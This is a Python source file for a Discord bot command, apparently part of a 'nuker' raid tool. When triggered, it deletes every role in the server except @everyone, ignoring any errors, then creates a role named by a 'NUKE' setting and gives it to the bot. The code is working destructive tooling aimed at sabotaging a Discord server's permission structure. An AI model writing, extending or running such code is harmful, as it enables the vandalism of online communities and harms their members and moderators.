from core.commands.base import BaseCommand
from core.config.settings import NUKE_ROLE_NAME, NUKE_ROLE_COLOR
import discord

class RoleNukeCommand(BaseCommand):
    async def _execute(self, ctx):
        if not ctx.guild.me.guild_permissions.manage_roles:
            await ctx.send("BOT NEEDS MANAGE ROLES PERMISSION", delete_after=3)
            return
        await ctx.send("DELETING ALL ROLES", delete_after=2)
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        new_role = await ctx.guild.create_role(name=NUKE_ROLE_NAME, color=NUKE_ROLE_COLOR)
        await ctx.guild.me.add_roles(new_role)
        await ctx.send(f"CREATED ROLE {NUKE_ROLE_NAME} AND ASSIGNED TO BOT")
